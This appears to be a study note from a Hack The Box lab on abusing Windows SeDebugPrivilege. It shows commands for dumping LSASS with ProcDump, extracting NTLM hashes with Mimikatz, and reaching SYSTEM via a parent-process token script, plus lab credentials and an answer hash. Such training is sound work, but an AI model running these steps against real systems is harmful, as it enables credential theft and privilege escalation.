# SeDebugPrivilege

SeDebugPrivilege -> allows a process to inspect and adjust the memory of other processes, and [has long been](https://leastprivilege.com/2004/08/19/sedebugprivilege-and-debugger-users/) [a security concern](https://blogs.msdn.microsoft.com/oldnewthing/20080314-00/?p=23113). SeDebugPrivilege allows the token bearer to access any process or thread, regardless of security descriptors.

The Windows credential harvesting tool [Lsadump](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) uses this technique to provide processes with read access to the memory space of the Local System Authority (LSASS).&#x20;

Malware also abuses this privilege to perform code injection into otherwise trustworthy processes, because it [permits the creation of new remote threads in a target process](https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege).

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set      
```

Use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to dump process memory. A good choice would be LSASS which stores user credentails after user logs on to a system.

```cmd-session
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

Successful, load this in Mimikatz using sekurlsa::minidump command after sekurlsa::logonPasswords

```cmd-session
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP> 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>
```

We can then use the output hash to perform PTH attacks

> If procdump is not possible then we can Create dump file of LSASS process manually and run mimikatz with the output file

### Remote Code Execution as SYSTEM

We can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using  `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it.

{% embed url="https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1" %}
This script has to be transferd to the target system
{% endembed %}

```powershell-session
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

![Script in action](https://academy.hackthebox.com/storage/modules/67/psgetsys\_winlogon.png)

To load and run type

{% code overflow="wrap" %}
```powershell
PS C:\Users\joran\Desktop> .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```
{% endcode %}

> We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script

## Assessment

10.129.249.171

RDP to target with username "jordan" and password "HTB\_@cademy\_j0rdan!"

Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm\_svc account

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption><p>dump the hash</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption><p>64f12cddaa88057e06a81b54e73b949b</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption><p>When you have local admin and want to get nt authority system</p></figcaption></figure>
